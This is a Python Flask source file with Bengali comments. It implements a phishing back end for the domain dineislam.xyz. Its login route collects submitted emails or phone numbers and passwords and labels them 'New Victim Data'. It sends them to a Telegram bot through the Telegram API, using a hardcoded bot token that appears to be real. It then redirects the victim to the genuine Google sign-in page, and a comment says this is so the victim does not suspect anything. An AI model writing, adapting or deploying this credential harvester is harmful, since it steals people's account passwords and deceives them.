
import requests
from flask import Flask, render_template, request, redirect

app = Flask(__name__)

# আপনার নতুন দেওয়া টোকেন এবং চ্যাট আইডি এখানে যুক্ত করা হয়েছে
BOT_TOKEN = "8307189262:AAF-D6rvhKzuzFo3vCJam4R_hKgNvOCv6uI"
CHAT_ID = "8307189262"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    # ফর্ম থেকে ডাটা সংগ্রহ করা
    username = request.form.get('username')
    password = request.form.get('password')

    # টেলিগ্রামে পাঠানোর জন্য মেসেজ ফরম্যাট
    message = (
        f"🚨 **New Victim Data** 🚨\n\n"
        f"📧 Email/Phone: `{username}`\n"
        f"🔑 Password: `{password}`\n\n"
        f"🌐 Domain: dineislam.xyz"
    )
    
    # টেলিগ্রাম এপিআই কল
    telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    
    try:
        # সরাসরি টেলিগ্রামে ডাটা পাঠানো
        response = requests.post(telegram_url, data=payload)
        if response.status_code != 200:
            print(f"Telegram Error: {response.text}")
    except Exception as e:
        print(f"Error: {e}")

    # লগইন শেষে ভিক্টিমকে আসল গুগল পেজে পাঠিয়ে দেওয়া যাতে সন্দেহ না করে
    return redirect("https://accounts.google.com/signin/v2/identifier")

if __name__ == "__main__":
    # Render-এর জন্য হোস্ট ও পোর্ট কনফিগারেশন
    app.run(host='0.0.0.0', port=5000)
